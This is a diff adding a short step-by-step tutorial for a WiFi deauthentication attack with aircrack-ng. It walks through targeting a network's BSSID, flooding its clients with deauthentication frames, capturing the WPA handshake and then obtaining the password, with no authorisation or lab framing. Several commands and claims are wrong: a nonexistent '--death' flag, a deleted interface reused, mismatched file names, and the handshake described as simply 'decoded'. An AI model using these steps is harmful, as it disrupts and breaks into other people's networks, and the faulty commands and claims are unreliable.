@@ -1,0 +1,26 @@
+First, update and download all aircrack-ng files using the following commands:
+> sudo apt update
+> sudo apt upgrade -y
+> sudo apt install aircrack-ng -y
+
+Then, execute these commands for the WiFi Deauthentication attack:
+
+1. iwconfig
+This command shows your WiFi adapter's interface. For example, it might be wlan0.
+
+2. iw wlan0 del
+This command will temporarily delete your wireless interface, stopping the internet and breaking your connection.
+
+3. airmon-ng start wlan0mon
+This command starts monitor mode on your adapter.
+
+4. airodump-ng wlan0mon
+This command shows all WiFi networks near your location. If it shows any errors or doesn't display networks, unplug and replug your WiFi adapter.
+
+5. airodump-ng wlan0mon -c CH --bssid BSSID -w handshack_file
+In this command, replace CH with the channel of your target and BSSID with the target's BSSID. Do not close the terminal or quit the process, as it will log all network traffic details. Open a new terminal window for the next command.
+
+6. aireplay-ng --death 0 -a BSSID wlan0mon
+WARNING: This command sends an infinite number of deauthentication requests to the target's router, causing the router to overflow and reject all active connections. All active connections will try to reconnect with the password, and we will capture the handshake. Stop this command immediately after the WPA handshake is captured in the first terminal window.
+
+Finally, decode the handshake_file.cap to obtain the actual password.
